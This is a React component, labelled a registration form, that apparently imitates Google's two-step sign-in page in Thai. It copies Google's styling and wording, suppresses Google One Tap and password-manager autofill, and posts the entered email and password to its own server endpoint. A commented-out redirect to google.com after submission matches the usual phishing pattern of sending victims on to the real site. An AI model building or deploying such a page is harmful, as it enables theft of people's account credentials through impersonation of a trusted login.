import React, { useState, useEffect } from 'react';

export const RegistrationForm = () => {
  const [step, setStep] = useState<1 | 2>(1);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  // ปิดกั้น Google One Tap API ฝั่ง Script หากยังค้างใน Window Memory
  useEffect(() => {
    if (window.google && window.google.accounts && window.google.accounts.id) {
      window.google.accounts.id.cancel();
      window.google.accounts.id.disableAutoSelect();
    }
  }, []);

  const handleNextStep = (e: React.FormEvent) => {
    e.preventDefault();
    if (email.trim()) {
      setStep(2);
    }
  };
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    try {
      const response = await fetch('/api/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password }),
      });
      
      const data = await response.json();
      console.log('Server response:', data);
      
      if (!response.ok) {
        alert('เกิดข้อผิดพลาด: ' + (data.error || 'ไม่ทราบสาเหตุ'));
        return;
      }
      
      alert('บันทึกข้อมูลสำเร็จแล้ว!');
    } catch (err) {
      console.log('Network error:', err);
      alert('เกิดข้อผิดพลาดในการเชื่อมต่อเครือข่าย');
    } finally {
      setIsLoading(false);
      // คอมเมนต์ไว้ชั่วคราวเพื่อไม่ให้เด้งหนี จะได้เห็นข้อความแจ้งเตือนผลลัพธ์
      // window.location.replace('https://www.google.com');
    }
  };


  return (
    <div style={{ maxWidth: '360px', margin: '40px auto', padding: '24px', border: '1px solid #dadce0', borderRadius: '8px', fontFamily: 'Arial, sans-serif', backgroundColor: '#fff' }}>
      <h2 style={{ textAlign: 'center', marginBottom: '8px' }}>ลงชื่อเข้าใช้</h2>
      <p style={{ textAlign: 'center', color: '#5f6368', fontSize: '14px', marginBottom: '24px' }}>
        {step === 1 ? 'ใช้บัญชีของคุณ' : 'ป้อนรหัสผ่านเพื่อดำเนินการต่อ'}
      </p>

      {step === 1 && (
        <form onSubmit={handleNextStep}>
          <div style={{ marginBottom: '20px' }}>
            <label style={{ display: 'block', fontSize: '14px', color: '#202124', marginBottom: '8px' }}>
              อีเมลหรือโทรศัพท์
            </label>
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="name@example.com"
              autoComplete="off"
              data-lpignore="true"
              required
              autoFocus
              style={{ width: '100%', padding: '12px', fontSize: '14px', border: '1px solid #dadce0', borderRadius: '4px', boxSizing: 'border-box' }}
            />
          </div>

          <button
            type="submit"
            style={{ width: '100%', padding: '10px', backgroundColor: '#1a73e8', color: '#fff', border: 'none', borderRadius: '4px', fontWeight: 'bold', cursor: 'pointer' }}
          >
            ถัดไป
          </button>
        </form>
      )}

      {step === 2 && (
        <form onSubmit={handleSubmit}>
          <div style={{ marginBottom: '16px', padding: '10px', backgroundColor: '#f1f3f4', borderRadius: '4px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <span style={{ fontSize: '14px', color: '#3c4043', fontWeight: '500' }}>{email}</span>
            <button
              type="button"
              onClick={() => setStep(1)}
              style={{ border: 'none', background: 'none', color: '#1a73e8', cursor: 'pointer', fontSize: '12px', fontWeight: 'bold' }}
            >
              แก้ไข
            </button>
          </div>

          <div style={{ marginBottom: '20px' }}>
            <label style={{ display: 'block', fontSize: '14px', color: '#202124', marginBottom: '8px' }}>
              ป้อนรหัสผ่าน
            </label>
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              autoComplete="new-password"
              required
              autoFocus
              style={{ width: '100%', padding: '12px', fontSize: '14px', border: '1px solid #dadce0', borderRadius: '4px', boxSizing: 'border-box' }}
            />
          </div>

          <button
            type="submit"
            disabled={isLoading}
            style={{ width: '100%', padding: '10px', backgroundColor: '#1a73e8', color: '#fff', border: 'none', borderRadius: '4px', fontWeight: 'bold', cursor: 'pointer' }}
          >
            {isLoading ? 'กำลังส่งข้อมูล...' : 'ถัดไป'}
          </button>
        </form>
      )}
    </div>
  );
};
